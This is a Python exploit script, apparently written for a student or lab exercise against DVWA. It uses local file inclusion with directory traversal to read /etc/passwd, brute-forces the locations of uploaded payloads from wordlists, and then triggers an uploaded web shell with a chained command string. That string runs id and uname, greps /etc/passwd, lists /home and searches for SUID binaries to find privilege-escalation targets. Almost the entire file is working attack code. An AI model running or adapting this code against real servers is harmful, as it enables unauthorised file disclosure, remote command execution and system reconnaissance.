#!/usr/bin/env python3

import requests
import urllib.parse
import re


def show_passwd(target_url, COOKIE):
    print("Attempting to show /etc/passwd...")

    passwd_dir = ["../../../../../../etc/passwd", "/etc/passwd"]

    for passwd in passwd_dir:
        test_url = target_url + passwd
        print(f"[*] Trying LFI URL: {test_url}")
        response = requests.get(test_url, cookies=COOKIE)

        if "root:" in response.text:
            print(response.text)
            return True
        else:
            print("FAILED")
    return False


def brute_force_lfi(
    lfi_url_base,
    payload_filenames,
    success_indicator,
    failure_indicator,
    session,
    COOKIE,
):

    print(f"Success indicator: {success_indicator}")
    print(f"Failure indicator: {failure_indicator}")

    with open("upload_dir_wordlist.txt", "r") as f:
        payload_relatives = [
            line.strip() for line in f if not line.strip().startswith("#")
        ]

    with open("traversal_small.txt", "r") as f:
        traversals = f.read().strip().split("\n")

    for payload_relative in payload_relatives:
        for traversal in traversals:
            for payload_filename in payload_filenames:
                test_url = (
                    f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
                )
                # print(f"[*] Trying LFI URL: {test_url}")
                try:
                    response = session.get(test_url, cookies=COOKIE)
                    # if "http://ict2214p1b2.mooo.com/" in lfi_url_base:
                    #     if "File not found." not in response.text:
                    #         print(f"[+] Successfully included payload: {test_url}")
                    #         return test_url
                    # elif "http://127.0.0.1/DVWA/" in lfi_url_base:
                    #     if not response.text.startswith("<!DOCTYPE html>"):
                    #         print(f"[+] Successfully included payload: {test_url}")
                    #         return test_url

                    if failure_indicator:
                        if failure_indicator not in response.text:
                            print(f"[+] Successfully included payload: {test_url}")
                            return test_url

                    if success_indicator:
                        if success_indicator in response.text:
                            print(f"[+] Successfully included payload: {test_url}")
                            return test_url

                except Exception as e:
                    print(f"[-] Error testing {test_url}: {str(e)}")

    return None


def trigger_payload_via_lfi(url, COOKIE):
    """
    Appends the command parameter to the LFI URL to trigger our uploaded payload.
    """
    commands = [
        "id",
        "uname -a",
        "grep 'x:1000:' /etc/passwd",
        "ls -lAh /home",
        "find /usr/bin /bin -perm -4000 2>/dev/null",
    ]
    cmd_string = ";".join(commands)
    separator = "&" if "?" in url else "?"
    full_url = f"{url}{separator}cmd={urllib.parse.quote(cmd_string)}"
    try:
        print(f"[*] Triggering payload via LFI at: {full_url}")
        response = requests.get(full_url, cookies=COOKIE)
        if response.status_code == 200:
            print("[+] Command results:")
            print(response.text)
            return response.text
        else:
            print(f"[-] Execution failed (HTTP {response.status_code})")
            return ""
    except Exception as e:
        print(f"[-] Trigger error: {str(e)}")
        return ""
